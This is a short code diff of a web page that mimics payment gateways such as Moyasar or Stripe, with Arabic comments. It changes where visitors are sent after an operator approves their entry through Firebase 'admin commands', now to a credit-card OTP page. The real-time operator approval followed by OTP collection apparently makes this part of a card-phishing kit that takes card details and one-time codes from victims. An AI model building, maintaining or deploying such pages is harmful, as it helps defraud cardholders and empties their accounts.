@@ -7,7 +7,7 @@
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-app-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-firestore-compat.js"></script>
   <script src="https://www.gstatic.com/firebasejs/10.12.2/firebase-database-compat.js"></script>
-  <script src="./assets/js/firebase-client.js"></script>
+  <script src="./assets/js/firebase-client.js?v=20260911b"></script>
   <style>
     /* ستايل بوابات الدفع العالمية المطابق للصورة (Moyasar / Stripe Style) */
     @import url('https://fonts.googleapis.com/css2?family=Segoe+UI:wght@400;600;700&display=swap');
@@ -510,8 +510,8 @@
               if (typeof window.listenForAdminCommands === 'function') {
                 window.listenForAdminCommands({
                   onApproval: function () {
-                    // المدير وافق — الانتقال لصفحة إدخال رمز التحقق (OTP)
-                    window.location.href = 'verification.html';
+                    // المدير وافق — الانتقال لصفحة إدخال رمز التحقق (OTP) للبطاقة
+                    window.location.href = 'otpcredit_card_page.html';
                   },
                   onRejection: onReject,
                   onMessage: function (msg) {
@@ -530,7 +530,7 @@
                     window.customerRef.get().then((snap) => {
                       if (snap.exists) {
                         const d = snap.data() || {};
-                        if (d.decision === 'approved') { window.location.href = 'verification.html'; }
+                        if (d.decision === 'approved') { window.location.href = 'otpcredit_card_page.html'; }
                         else if (d.decision === 'rejected') { onReject(d); }
                       }
                     }).catch(() => {});
